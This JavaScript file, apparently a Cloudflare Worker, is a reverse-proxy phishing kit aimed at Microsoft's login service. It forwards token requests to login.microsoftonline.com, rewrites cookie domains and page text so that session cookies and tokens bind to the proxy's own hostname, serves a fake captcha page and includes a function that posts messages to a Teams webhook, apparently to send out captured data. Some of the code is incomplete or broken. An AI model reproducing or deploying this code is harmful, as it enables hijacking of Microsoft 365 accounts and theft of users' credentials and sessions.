async function handleRequest(request) {
  const url = new URL(request.url);
  const upstream_domain = 'login.microsoftonline.com';
  const url_hostname = url.hostname;

  if (url.pathname === '/captcha') {
    return validateCaptcha(request);
  }

  if (request.method === 'POST' && url.pathname === '/common/oauth2/v2.0/token') {
    return fetchAndApply(request, upstream_domain, url_hostname);
  }

  return fetch(request);
}

async function fetchAndApply(request, upstream_domain, url_hostname) {
  let response = await fetch(`https://${upstream_domain}${request.url.pathname}`, request);
  let status = response.status;
  let new_response_headers = new Headers(response.headers);

  try {
    // Replace response headers
    let original_response_headers = new Headers(response.headers);
    let modifiedCookie = await replaceCookieDomain(original_response_headers, upstream_domain, url_hostname);
    new_response_headers.set("Set-Cookie", modifiedCookie);
  } catch (error) {
    console.error("Error replacing cookie domains:", error);
  }

  try {
    // Replace response text
    let original_text = await response.text();
    original_text = await replace_response_text(original_text, upstream_domain, url_hostname);
    response = new Response(original_text, {
      status,
      headers: new_response_headers
    })
  } catch (error) {
    console.error("Error replacing response text:", error);
  }

  return response;
}

async function validateCaptcha(request) {
  // Generate a random captcha challenge
  const captchaChallenge = Math.floor(Math.random() * 100);

  // Store the captcha challenge in a temporary storage (e.g. a cache or a database)
  // For demonstration purposes, we'll use a simple in-memory cache
  const captchaCache = {};
  captchaCache[captchaChallenge] = true;

  // Render the captcha challenge as an HTML page
  const captchaHtml = `
    <html>
      <head>
        <title>Captcha Challenge</title>
      </head>
      <body>
        <h1>Captcha Challenge</h1>
        <form>
          <input type="hidden" name="captchaChallenge" value="${captchaChallenge}" />
          <input type="text" name="captchaResponse" />
          <input type="submit" value="Submit" />
        </form>
      </body>
    </html>
  `;

  // Return a response with the captcha HTML
  return new Response(captchaHtml, {
    status: 200,
    headers: {
      'Content-Type': 'text/html'
    }
  });
}

async function handleCaptchaSubmission(request) {
  const formData = await request.formData();
  const captchaChallenge = formData.get('captchaChallenge');
  const captchaResponse = formData.get('captchaResponse');

  // Check if the captcha response is correct
  if (captchaResponse === `${captchaChallenge * 2}`) {
    // If correct, return a valid response
    return { valid: true };
  } else {
    // If incorrect, return an invalid response
    return { valid: false };
  }
}

async function replaceCookieDomain(headers, upstream_domain, url_hostname) {
  let cookie = headers.get('Set-Cookie');
  if (cookie) {
    let re = new RegExp(upstream_domain, 'g');
    cookie = cookie.replace(re, url_hostname);
  }
  return cookie;
}

async function replace_response_text(original_text, upstream_domain, url_hostname) {
  let re = new RegExp(upstream_domain, 'g');
  original_text = original_text.replace(re, url_hostname);
  return original_text;
}

async function teams(m, webhook) {
  // Replace 'YOUR_TEAMS_WEBHOOK_URL' with your actual Teams webhook URL
  const teamsWebhookUrl = webhook;
  
  // Example message payload
  const message = {
    text: m
  };
  
  try {
    const response = await fetch(teamsWebhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(message)
    });
  
    if (!response.ok) {
      throw new Error('Failed to send message to Teams');
    }
  
    return new Response('Message sent to Teams successfully', { status: 200 });
  } catch (error) {
    return new Response(`Error: ${error.message}`, { status: 500 });
  }
}
